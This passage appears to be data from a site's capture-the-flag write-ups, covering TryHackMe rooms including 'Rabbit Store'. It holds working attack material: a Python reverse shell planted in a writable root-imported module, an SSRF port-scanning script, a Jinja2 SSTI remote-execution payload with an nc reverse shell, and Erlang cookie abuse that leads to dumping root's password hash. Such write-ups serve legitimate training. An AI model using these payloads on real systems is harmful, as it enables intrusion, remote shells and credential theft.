      { type: "text", content: "As valley, we still don't get sudo. So we hunt for root automation: cron jobs, systemd timers, backups, scripts, writable paths." },
      { type: "code", content: "cat /etc/crontab" },
      { type: "image", content: "Pasted image 20260216191259.png", alt: "Crontab screenshot" },
      { type: "text", content: "We spot a root-run Python script: /photos/script/photosEncrypt.py" },
      { type: "image", content: "Pasted image 20260216191414.png", alt: "photosEncrypt.py screenshot" },
      { type: "callout", content: "Pointer: If a root Python script imports a module and you can write to that module's file, you can hijack the import and execute code as root when the cron runs." },
      { type: "text", content: "The script imports base64, so we locate the module on disk and check permissions:" },
      { type: "code", content: "locate base64.py\nls -l /usr/lib/python3.8/base64.py" },
      { type: "image", content: "Pasted image 20260216191540.png", alt: "base64.py permissions screenshot" },
      { type: "text", content: "base64.py is writable. We add a reverse shell payload inside it." },
      { type: "code", content: "# Listener (your machine):\nnc -lvnp 1234\n\n# Payload (insert into /usr/lib/python3.8/base64.py):\nimport socket\nimport subprocess\nimport os\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((\"192.168.184.65\", 1234))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\nimport pty; pty.spawn(\"/bin/sh\")" },
      { type: "image", content: "Pasted image 20260216192129.png", alt: "Reverse shell screenshot" },
      { type: "text", content: "After the cron executes the root Python script, we receive a root shell. Then we read the root flag and finish the room." },
      { type: "image", content: "Pasted image 20260216192215.png", alt: "Root flag screenshot" },
      { type: "callout", content: "Takeaways: Client-side auth (JS validation) leaks secrets • Credential reuse turns small leaks into full compromise • PCAPs often contain plaintext credentials • Writable Python libs + root cron = instant privilege escalation." },
    ],
  },
  "rabbitstore": {
    title: "Rabbit Store",
    meta: "TryHackMe • Linux • Medium",
    slug: "rabbitstore",
    baseImageUrl: "/labs/Tryhackme/Rabbitstore/",
    sections: [
      { type: "heading", content: "Goal" },
      { type: "list", content: "", items: [
        "User flag",
        "Root flag"
      ]},
      { type: "text", content: "Target: cloudsite.thm / storage.cloudsite.thm" },

      { type: "heading", content: "0) Hostname setup" },
      { type: "text", content: "The box uses virtual hosts. Before you start browsing, map the target IP to the domains used by the app." },
      { type: "code", content: "sudo vim /etc/hosts\n\n10.80.139.58 cloudsite.thm www.cloudsite.thm" },

      { type: "heading", content: "1) Recon" },
      { type: "text", content: "Start broad: scan all TCP ports and grab service/version info." },
      { type: "code", content: "nmap -T4 -p- -A -r -Pn -v -sV -oN scan.nmap 10.80.139.58" },
      { type: "image", content: "Pasted image 20260217112240.png", alt: "Nmap results: SSH + HTTP, plus Erlang/RabbitMQ-related ports" },
      { type: "text", content: "The normal services are there (22 SSH, 80 HTTP), but the real items are the Erlang/RabbitMQ ports:" },
      { type: "list", content: "", items: [
        "4369 — EPMD (Erlang Port Mapper Daemon)",
        "25672 — Erlang distribution / RabbitMQ clustering"
      ]},
      { type: "callout", content: "Pointer: When you see Erlang ports, assume a hidden \"cookie\" is the key. You often won't exploit these directly from the outside — usually you first gain a foothold, then steal .erlang.cookie." },

      { type: "heading", content: "2) Web enumeration" },
      { type: "text", content: "Quick directory fuzzing against the main vhost." },
      { type: "code", content: "ffuf -u http://cloudsite.thm/FUZZ \\\n  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n  -fc 404 -s -e .php,.txt,.html" },
      { type: "image", content: "Pasted image 20260217112153.png", alt: "ffuf results" },
      { type: "text", content: "/assets exists, but doesn't lead to an obvious vulnerability. So we pivot to the login/register flow." },

      { type: "heading", content: "3) Broken access control → \"active\" subscription" },
      { type: "text", content: "The login/register link pushes us to a different host, so we add another vhost entry:" },
      { type: "code", content: "sudo vim /etc/hosts\n\n10.80.139.58 storage.cloudsite.thm www.storage.cloudsite.thm" },
      { type: "text", content: "Register a normal user first to see the baseline behavior." },
      { type: "image", content: "Pasted image 20260217115456.png", alt: "Registration page" },
      { type: "text", content: "After login, the app blocks us because the account is \"inactive\"." },
      { type: "image", content: "Pasted image 20260217115527.png", alt: "Inactive message" },
      { type: "text", content: "Cookies include a JWT. Decoding it reveals fields like the email and subscription state." },
      { type: "image", content: "Pasted image 20260217115705.png", alt: "JWT decoded" },
      { type: "callout", content: "Pointer: If the app uses JWTs, first question: \"Can I set privileged fields earlier (registration / profile update)?\"" },
      { type: "text", content: "We intercept the register request and inject a subscription field:" },
      { type: "image", content: "Pasted image 20260217115936.png", alt: "Burp intercept register" },
      { type: "code", content: "// Baseline:\n{\"email\": \"admin2@example.com\", \"password\": \"admin\"}\n\n// Upgraded:\n{\"email\": \"admin2@example.com\", \"password\": \"admin\", \"subscription\": \"active\"}" },
      { type: "callout", content: "Pointer: This is a classic server-side validation failure. Privileged fields must be computed server-side, not trusted from client JSON." },

      { type: "heading", content: "4) Portal access + first attempts" },
      { type: "text", content: "Login with the new \"active\" account and the portal opens." },
      { type: "image", content: "Pasted image 20260217120336.png", alt: "Storage dashboard" },
      { type: "text", content: "Three primary features: Upload file, Upload from URL (often SSRF), View/list uploads." },
      { type: "text", content: "Uploading an executable payload doesn't work — the server renames files and strips extensions." },
      { type: "image", content: "Pasted image 20260217120601.png", alt: "Upload extension stripped" },
      { type: "callout", content: "Pointer: When upload execution is blocked, features like \"fetch from URL\" can be far more dangerous than uploads." },
      { type: "text", content: "The routing suggests an API backing the portal, so we fuzz under /api." },
      { type: "image", content: "Pasted image 20260217121056.png", alt: "API fuzz" },
      { type: "text", content: "/api/docs looks promising, but we're blocked:" },
      { type: "image", content: "Pasted image 20260217121043.png", alt: "API docs denied" },
      { type: "callout", content: "Pointer: Internal docs are gold. If you can SSRF into them, you often skip hours of guessing endpoints/params." },

      { type: "heading", content: "5) SSRF via \"Upload from URL\"" },
      { type: "text", content: "The \"store URL\" feature lets the server fetch a URL and store it. The internal service is on a different port, so we port-hunt through SSRF." },
      { type: "code", content: "import requests\nfrom concurrent.futures import ThreadPoolExecutor\nimport sys\n\nTARGET = \"http://storage.cloudsite.thm/api/store-url\"\nJWT = \"<your_jwt_cookie_value_here>\"\n\nports = range(1, 65535)\ncookies = {\"jwt\": JWT}\nheaders = {\"Content-Type\": \"application/json\"}\n\ndef scan(port: int):\n    payload = {\"url\": f\"http://localhost:{port}/\"}\n    try:\n        r = requests.post(TARGET, headers=headers, cookies=cookies, json=payload, timeout=3)\n        if r.status_code != 401 and len(r.text) != 41:\n            print(f\"[+] Interesting port {port}: status={r.status_code}, size={len(r.text)}\")\n    except Exception:\n        pass\n\nprint(\"[*] Starting SSRF port scan...\")\nwith ThreadPoolExecutor(max_workers=100) as ex:\n    ex.map(scan, ports)" },
      { type: "image", content: "Pasted image 20260217130104.png", alt: "SSRF port scan output" },
      { type: "text", content: "Port 3000 reveals the internal API docs." },
      { type: "image", content: "Pasted image 20260217130319.png", alt: "Internal API docs page 1" },
      { type: "image", content: "Pasted image 20260217130337.png", alt: "Internal API docs page 2" },
      { type: "text", content: "The endpoint we care about: /api/fetch_messeges_from_chatbot (typo included)." },
      { type: "image", content: "Pasted image 20260217130720.png", alt: "Calling the chatbot endpoint in Burp" },
      { type: "text", content: "It reflects our input back:" },
      { type: "image", content: "Pasted image 20260217130758.png", alt: "Reflected input" },
      { type: "callout", content: "Pointer: Reflection isn't automatically SSTI — but it's enough to justify a low-noise template probe." },

      { type: "heading", content: "6) SSTI → RCE → user flag" },
      { type: "text", content: "Probe for SSTI (polyglot):" },
      { type: "image", content: "Pasted image 20260217131028.png", alt: "SSTI polyglot test" },
      { type: "text", content: "Confirm engine with arithmetic:" },
      { type: "code", content: "{{7*7}}" },
      { type: "image", content: "Pasted image 20260217131132.png", alt: "7*7 works — Jinja2 confirmed" },
      { type: "text", content: "Escalate to OS command execution:" },
      { type: "code", content: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}" },
      { type: "image", content: "Pasted image 20260217131402.png", alt: "RCE confirmed" },
      { type: "callout", content: "Pointer: Always prove execution with something safe (id/whoami). Then switch to a reverse shell." },
      { type: "text", content: "Start a listener and trigger a shell:" },
      { type: "code", content: "nc -lvnp 1234\n\n{{config.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <YOUR_IP> 1234 >/tmp/f').read()}}" },
      { type: "image", content: "Pasted image 20260217132037.png", alt: "Reverse shell triggered" },
      { type: "image", content: "Pasted image 20260217132116.png", alt: "Interactive shell on target" },
      { type: "text", content: "Grab the user flag:" },
      { type: "image", content: "Pasted image 20260217132144.png", alt: "User flag obtained" },

      { type: "heading", content: "7) PrivEsc: Erlang cookie → RabbitMQ admin → root" },
      { type: "text", content: "Those Erlang ports we saw earlier become useful once we obtain the shared cookie file." },
      { type: "text", content: "Locate .erlang.cookie:" },
      { type: "image", content: "Pasted image 20260217132718.png", alt: "Cookie file discovered" },
      { type: "code", content: "Cookie value: wNkProKxfl30BVjY" },
      { type: "callout", content: "Pointer: If you ever see .erlang.cookie readable by your current user, that's usually game-changing. Treat it like a password for RabbitMQ's internal communication." },
      { type: "text", content: "Use Erlang distribution helper (shell-erldp):" },
      { type: "code", content: "python2 shell-erldp.py 10.80.139.58 25672 wNkProKxfl30BVjY" },
      { type: "image", content: "Pasted image 20260217143836.png", alt: "Shell obtained as RabbitMQ service user" },
      { type: "text", content: "Fix cookie permissions:" },
      { type: "code", content: "chmod 600 .erlang.cookie" },
      { type: "image", content: "Pasted image 20260217144232.png", alt: "Cookie permissions adjusted" },
      { type: "text", content: "Create a RabbitMQ administrator user:" },
      { type: "code", content: "rabbitmqctl add_user <username> <password>\nrabbitmqctl set_user_tags <username> administrator" },
      { type: "image", content: "Pasted image 20260217144625.png", alt: "New RabbitMQ admin user created" },
      { type: "text", content: "Extract root's stored hash:" },
      { type: "image", content: "Pasted image 20260217144904.png", alt: "Root hash recovered" },
      { type: "code", content: "{\n  \"name\":\"root\",\n  \"password_hash\":\"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF\",\n  \"hashing_algorithm\":\"rabbit_password_hashing_sha256\",\n  \"tags\":[\"administrator\"],\n  \"limits\":{}\n}" },
      { type: "text", content: "Decode base64 and split salt/hash:" },
      { type: "code", content: "import base64, binascii\n\nhash_b64 = \"49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF\"\nraw = base64.b64decode(hash_b64)\n\nsalt = raw[:4]\ndigest = raw[4:]\n\nprint(\"Salt:\", binascii.hexlify(salt).decode())\nprint(\"Hash:\", binascii.hexlify(digest).decode())" },
      { type: "image", content: "Pasted image 20260217151115.png", alt: "Decoded salt + SHA-256 digest" },
      { type: "text", content: "Switch to root:" },
      { type: "code", content: "su - root" },
      { type: "image", content: "Pasted image 20260217151151.png", alt: "Root access achieved" },
      { type: "callout", content: "Final takeaways: Registration endpoints matter — if the server trusts client JSON fields, roles can be self-assigned • SSRF unlocks internal-only docs + admin APIs • SSTI is a fast escalation chain: reflection → evaluation → RCE → shell • Erlang cookie is critical: once leaked, RabbitMQ internals become reachable." },
    ],
  },
};
